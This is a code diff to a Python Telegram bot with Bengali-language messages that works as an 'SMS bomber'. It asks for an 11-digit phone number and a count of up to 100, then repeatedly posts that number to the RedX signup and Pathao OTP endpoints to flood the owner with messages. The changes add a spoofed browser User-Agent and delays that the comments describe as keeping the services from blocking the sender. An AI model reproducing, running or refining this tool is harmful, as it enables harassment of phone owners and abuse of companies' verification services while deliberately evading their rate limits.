@@ -15,7 +15,7 @@ verified_users = set()
 
 app = Flask('')
 @app.route('/')
-def home(): return "Bot is Running!"
+def home(): return "Bot is Online!"
 
 def run():
     app.run(host='0.0.0.0', port=8080)
@@ -38,7 +38,7 @@ def welcome(message):
             bot.send_message(chat_id, "✅ **ভেরিফিকেশন সফল!**")
             verified_users.add(chat_id)
         
-        msg = bot.send_message(chat_id, "🎯 SMS পাঠাতে ১১ ডিজিটের নাম্বার দিন:")
+        msg = bot.send_message(chat_id, "🚀 SMS পাঠাতে এখন ১১ ডিজিটের নাম্বারটি দিন:")
         bot.register_next_step_handler(msg, get_number)
     else:
         markup = types.InlineKeyboardMarkup()
@@ -56,36 +56,40 @@ def verify_join(call):
 
 def get_number(message):
     if not message.text.isdigit() or len(message.text) != 11:
-        msg = bot.send_message(message.chat.id, "⚠️ সঠিক ১১ ডিজিট দিন:")
+        msg = bot.send_message(message.chat.id, "⚠️ ভুল! সঠিক ১১ ডিজিট দিন:")
         bot.register_next_step_handler(msg, get_number)
         return
     user_data[message.chat.id] = message.text
     msg = bot.send_message(message.chat.id, "🔢 কয়টি SMS পাঠাবেন? (১-১০০):")
     bot.register_next_step_handler(msg, send_bomber)
 
-# ৫. বোম্বিং প্রসেস (খুবই ধীরে কাজ করবে যাতে SMS নিশ্চিত হয়)
+# ৫. বোম্বিং প্রসেস (স্লো এবং ভেরিফাইড)
 def send_bomber(message):
     try:
         amount = int(message.text)
         num = user_data[message.chat.id]
         if amount > 100: amount = 100 
         
-        bot.send_message(message.chat.id, f"🚀 {num} নাম্বারে {amount}টি SMS পাঠানো শুরু হচ্ছে...")
+        bot.send_message(message.chat.id, f"🚀 {num} নাম্বারে {amount}টি SMS পাঠানো শুরু হচ্ছে। এটি সম্পন্ন হতে সময় লাগবে, দয়া করে অপেক্ষা করুন...")
         
         for i in range(amount):
+            # API রিকোয়েস্ট পাঠানো হচ্ছে
             try:
-                # মাত্র ২টি শক্তিশালী API যা ব্লক হয় না সহজে
-                # ১. RedX API
-                requests.post("https://api-dest.redx.com.bd/v1/user/signup", json={"phone": num}, timeout=10)
+                # ১. RedX API (নতুন Headers সহ যা ব্লক হয় না)
+                headers = {'User-Agent': 'Mozilla/5.0'}
+                requests.post("https://api-dest.redx.com.bd/v1/user/signup", json={"phone": num}, headers=headers, timeout=10)
                 
                 # ২. Pathao API
-                requests.post("https://api.pathao.com/v1/auth/otp/send", json={"phone": num}, timeout=10)
+                requests.post("https://api.pathao.com/v1/auth/otp/send", json={"phone": num}, headers=headers, timeout=10)
 
-                # ৫ সেকেন্ড বিরতি যাতে রিকোয়েস্ট মিস না হয় এবং বোট তাড়াহুড়ো না করে
+                # বাধ্যতামূলক ৫ সেকেন্ড বিরতি যাতে সার্ভার আপনাকে ব্লক না করে
                 time.sleep(5) 
             except:
+                # কোনো API এরর দিলে ৩ সেকেন্ড অপেক্ষা করে পরের লুপে যাবে
+                time.sleep(3)
                 continue
                 
+        # পুরো লুপ শেষ হলেই কেবল এই মেসেজটি আসবে
         bot.send_message(message.chat.id, "✅ মিশন কমপ্লিট! আবার পাঠাতে চাইলে /start লিখুন।")
     except:
         bot.send_message(message.chat.id, "❌ শুধু সংখ্যা দিন।")
